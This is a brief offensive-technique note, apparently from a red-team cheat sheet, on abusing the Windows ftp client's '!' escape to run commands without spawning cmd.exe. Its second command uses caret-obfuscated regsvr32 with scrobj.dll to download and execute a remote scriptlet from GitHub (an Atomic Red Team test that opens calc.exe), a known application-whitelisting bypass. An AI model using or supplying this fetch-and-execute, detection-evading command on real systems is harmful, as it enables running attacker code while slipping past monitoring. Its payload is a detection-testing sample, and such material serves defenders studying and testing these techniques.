### FTP fun

Using native FTP to execute commands without using the cmd.exe process

```
#this excutes dir and lists all directores and saves to C:\Users\<username>\filelist.txt
ftp> !dir /ad > filelist.txt

#this load the the github script and excutes calc.exe
ftp> !r^e^g^s^v^r^3^2.e^x^e /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct scrobj.dll
```



